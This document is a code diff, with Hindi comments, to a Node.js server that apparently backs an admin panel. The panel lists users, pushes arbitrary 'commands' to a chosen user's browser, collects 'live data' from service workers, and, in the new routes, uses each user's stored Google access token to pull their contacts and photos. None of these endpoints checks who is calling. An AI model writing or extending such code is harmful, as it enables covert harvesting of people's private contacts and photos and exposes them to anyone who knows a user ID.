@@ -5,29 +5,25 @@ const express = require('express');
 const webpush = require('web-push');
 const bodyParser = require('body-parser');
 const path = require('path');
-// सबसे ज़रूरी बदलाव: Firebase की एडमिन लाइब्रेरी जोड़ना
 const admin = require('firebase-admin');
+// सबसे ज़रूरी नया पैकेज: गूगल की आधिकारिक लाइब्रेरी
+const { google } = require('googleapis');
 
 // =================================================================
-// 2. Firebase एडमिन को शुरू करना (यह सबसे ज़रूरी नया हिस्सा है)
+// 2. Firebase एडमिन को शुरू करना (अपरिवर्तित)
 // =================================================================
-// यह 'मास्टर चाबी' Render के एनवायरनमेंट वेरिएबल्स से सुरक्षित रूप से आएगी
 try {
     const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT_KEY);
-
-    admin.initializeApp({
-      credential: admin.credential.cert(serviceAccount)
-    });
-
-    const db = admin.firestore(); // Firestore डेटाबेस से कनेक्शन
+    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
+    const db = admin.firestore();
     console.log("Firebase Admin सफलतापूर्वक शुरू हो गया है।");
 } catch (error) {
-    console.error("Firebase Admin को शुरू करने में विफल: सुनिश्चित करें कि FIREBASE_SERVICE_ACCOUNT_KEY सही है।", error);
+    console.error("Firebase Admin को शुरू करने में विफल:", error);
     process.exit(1);
 }
 
 // =================================================================
-// 3. सर्वर और VAPID कुंजियों को सेटअप करें (यह पहले जैसा ही है)
+// 3. सर्वर और VAPID कुंजियों को सेटअप करें (अपरिवर्तित)
 // =================================================================
 const app = express();
 app.use(bodyParser.json());
@@ -36,79 +32,108 @@ app.use(express.static(path.join(__dirname, 'public')));
 const publicVapidKey = process.env.PUBLIC_VAPID_KEY;
 const privateVapidKey = process.env.PRIVATE_VAPID_KEY;
 
-// जांचें कि क्या सभी ज़रूरी चाबियाँ मौजूद हैं
-if (!publicVapidKey || !privateVapidKey || !process.env.FIREBASE_SERVICE_ACCOUNT_KEY) {
-    console.error("एक या अधिक एनवायरनमेंट वेरिएबल्स (VAPID or Firebase) सेट नहीं हैं!");
-    process.exit(1);
-}
-
 webpush.setVapidDetails('mailto:your-email@example.com', publicVapidKey, privateVapidKey);
 
 // =================================================================
-// 4. API रूट्स (Endpoints) - अब ये Firestore से बात करेंगे
+// 4. API रूट्स (Endpoints) - अब गूगल डेटा के लिए नए रूट्स के साथ
 // =================================================================
 
-// इस वेरिएबल को अभी भी सर्विस वर्कर से आने वाले लाइव डेटा के लिए रखा गया है
 let reportedData = [];
 
-// ---- रूट 1: एडमिन पैनल के लिए सभी उपयोगकर्ताओं की लिस्ट लाना ----
+// ---- रूट 1: एडमिन पैनल के लिए सभी उपयोगकर्ताओं की लिस्ट लाना (अपरिवर्तित) ----
 app.get('/get-users', async (req, res) => {
     try {
-        const usersSnapshot = await db.collection('users').orderBy('lastLogin', 'desc').get();
-        const users = [];
-        usersSnapshot.forEach(doc => {
-            const userData = doc.data();
-            // हम एडमिन पैनल को सिर्फ ज़रूरी जानकारी भेजते हैं, टोकन नहीं
-            users.push({
-                uid: userData.uid,
-                displayName: userData.displayName,
-                email: userData.email,
-                photoURL: userData.photoURL
-            });
-        });
-        res.status(200).json(users);
+        const usersSnapshot = await admin.firestore().collection('users').orderBy('lastLogin', 'desc').get();
+        const users = usersSnapshot.docs.map(doc => ({
+            uid: doc.id,
+            ...doc.data()
+        }));
+        res.status(200).json(users.map(u => ({ uid: u.uid, displayName: u.displayName, email: u.email, photoURL: u.photoURL })));
     } catch (error) {
-        console.error("Firestore से उपयोगकर्ताओं को लाने में त्रुटि:", error);
-        res.status(500).json({ status: 'error', message: 'Failed to fetch users.' });
+        console.error("उपयोगकर्ताओं को लाने में त्रुटि:", error);
+        res.status(500).json({ error: 'Failed to fetch users.' });
     }
 });
 
-
-// ---- रूट 2: किसी चुने हुए उपयोगकर्ता को कमांड भेजना (अब ज़्यादा स्मार्ट है) ----
+// ---- रूट 2: किसी चुने हुए उपयोगकर्ता को कमांड भेजना (अपरिवर्तित) ----
 app.post('/send-command', async (req, res) => {
     const { userId, command } = req.body;
-
-    if (!userId || !command) {
-        return res.status(400).json({ status: 'error', message: 'User ID and command are required.' });
-    }
-
     try {
-        // Firestore से उस खास उपयोगकर्ता का दस्तावेज़ प्राप्त करें
-        const userDoc = await db.collection('users').doc(userId).get();
-        if (!userDoc.exists) {
-            return res.status(404).json({ status: 'error', message: 'User not found in database.' });
-        }
-
-        const userData = userDoc.data();
-        const userSubscription = userData.pushSubscription;
-
-        if (!userSubscription) {
-            return res.status(400).json({ status: 'error', message: 'User is not subscribed for notifications.' });
-        }
+        const userDoc = await admin.firestore().collection('users').doc(userId).get();
+        if (!userDoc.exists) return res.status(404).json({ error: 'User not found.' });
+        const { pushSubscription } = userDoc.data();
+        if (!pushSubscription) return res.status(400).json({ error: 'User not subscribed.' });
         
-        console.log(`उपयोगकर्ता ${userId} को कमांड भेजा जा रहा है:`, command);
-
-        await webpush.sendNotification(userSubscription, JSON.stringify(command));
-        res.status(200).json({ status: 'success', message: 'Command sent successfully.' });
-
+        await webpush.sendNotification(pushSubscription, JSON.stringify(command));
+        res.status(200).json({ success: true });
     } catch (error) {
         console.error("कमांड भेजने में त्रुटि:", error);
-        res.status(500).json({ status: 'error', message: 'Failed to send command.' });
+        res.status(500).json({ error: 'Failed to send command.' });
+    }
+});
+
+// ==========================================================================
+// === बदलाव यहाँ से शुरू होता है: गूगल डेटा प्राप्त करने के लिए नए रूट्स ===
+// ==========================================================================
+
+// ---- रूट 3: किसी उपयोगकर्ता के गूगल कॉन्टैक्ट्स लाना ----
+app.get('/get-contacts/:userId', async (req, res) => {
+    const { userId } = req.params;
+    try {
+        const userDoc = await admin.firestore().collection('users').doc(userId).get();
+        if (!userDoc.exists) return res.status(404).json({ error: 'User not found.' });
+        
+        const { googleAccessToken } = userDoc.data();
+        if (!googleAccessToken) return res.status(400).json({ error: 'User has no access token.' });
+
+        const oauth2Client = new google.auth.OAuth2();
+        oauth2Client.setCredentials({ access_token: googleAccessToken });
+
+        const people = google.people({ version: 'v1', auth: oauth2Client });
+        const response = await people.people.connections.list({
+            resourceName: 'people/me',
+            personFields: 'names,emailAddresses,phoneNumbers',
+        });
+        
+        res.status(200).json(response.data.connections || []);
+
+    } catch (error) {
+        console.error("कॉन्टैक्ट्स लाने में त्रुटि:", error);
+        res.status(500).json({ error: 'Failed to fetch contacts.' });
+    }
+});
+
+// ---- रूट 4: किसी उपयोगकर्ता की गूगल फोटोज लाना ----
+app.get('/get-photos/:userId', async (req, res) => {
+    const { userId } = req.params;
+    try {
+        const userDoc = await admin.firestore().collection('users').doc(userId).get();
+        if (!userDoc.exists) return res.status(404).json({ error: 'User not found.' });
+
+        const { googleAccessToken } = userDoc.data();
+        if (!googleAccessToken) return res.status(400).json({ error: 'User has no access token.' });
+        
+        // Photos API का उपयोग करने के लिए आपको Google Cloud में Photos Library API को सक्षम करना होगा
+        const oauth2Client = new google.auth.OAuth2();
+        oauth2Client.setCredentials({ access_token: googleAccessToken });
+        
+        // यह एक अनौपचारिक तरीका है Photos API को Node.js में इस्तेमाल करने का
+        const photoApiUrl = 'https://photoslibrary.googleapis.com/v1/mediaItems?pageSize=50';
+        const photoResponse = await fetch(photoApiUrl, {
+            headers: { 'Authorization': `Bearer ${googleAccessToken}` }
+        });
+        const photoData = await photoResponse.json();
+
+        res.status(200).json(photoData.mediaItems || []);
+
+    } catch (error) {
+        console.error("फोटोज लाने में त्रुटि:", error);
+        res.status(500).json({ error: 'Failed to fetch photos.' });
     }
 });
 
 
-// ---- रूट 3 और 4 (अपरिवर्तित) - लाइव डेटा को संभालने के लिए ----
+// ---- रूट 5 और 6 (अपरिवर्तित) - लाइव डेटा को संभालने के लिए ----
 app.post('/report-data', (req, res) => {
     const data = req.body;
     data.timestamp = new Date().toISOString();
@@ -118,10 +143,11 @@ app.post('/report-data', (req, res) => {
 
 app.get('/get-reported-data', (req, res) => {
     res.status(200).json(reportedData);
+    reportedData = []; // डेटा भेजने के बाद उसे खाली कर दें
 });
 
 // =================================================================
-// 5. सर्वर को शुरू करना
+// 6. सर्वर को शुरू करना
 // =================================================================
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
